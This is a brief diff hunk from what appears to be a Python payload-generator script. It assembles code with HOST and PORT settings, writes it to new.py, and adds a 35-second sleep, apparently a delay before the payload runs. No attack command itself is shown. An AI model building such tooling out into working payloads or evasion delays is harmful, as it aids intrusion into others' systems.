@@ -50,6 +50,7 @@ def begin():
     payload += 'from time import sleep\n'
     payload += 'HOST = ' + "'" + host + "'" + '\n'
     payload += 'PORT = ' + port + '\n'
+    payload += 'sleep(35)\n'
     payload += str(o)
 
     with open('new.py', 'w') as f:
